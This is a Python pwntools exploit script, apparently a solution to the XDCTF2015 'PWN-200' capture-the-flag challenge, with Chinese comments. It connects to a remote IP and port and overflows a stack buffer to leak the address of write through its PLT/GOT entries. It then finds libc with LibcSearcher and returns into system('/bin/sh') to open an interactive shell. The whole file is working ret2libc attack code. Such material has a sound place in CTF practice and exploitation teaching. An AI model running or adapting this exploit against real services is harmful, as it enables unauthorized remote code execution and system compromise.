#coding:utf-8
from pwn import *
from LibcSearcher import *
import sys

local = 0
if local:         #if else 使用选择本地或者远程
	p = process('./PWN-200')
else:
	p = remote("111.198.29.45",57514)

def leak():
    p.recvuntil("Welcome to XDCTF2015~!\n")
    payload = 'a' * 112 + p32(write_plt) + p32(0x80483d0) + p32(1) + p32(write_got) + p32(4) # 返回到0x8048484使得泄漏可以重复
    p.send(payload)                                      #  write函数接收参数的顺序，从右到左依次入栈。
    data = u32(p.recv(4))
    return data
def attack():
    payload = 'a' * 112 +p32(system_addr) + p32(1234) + p32(bin_sh_addr)
    p.send(payload)

elf = ELF('./pwn-200')
write_got = elf.got['write']
print hex(write_got )
write_plt = elf.plt['write']
print hex(write_plt)
data = leak()
libc=LibcSearcher("write",data)
libc_base = data - libc.dump("write")
log.success('libc_base:' + hex(libc_base))
system_addr = libc_base + libc.dump("system")
log.success('system:' + hex(system_addr))
bin_sh_addr = libc_base + libc.dump("str_bin_sh")
attack()
p.interactive()
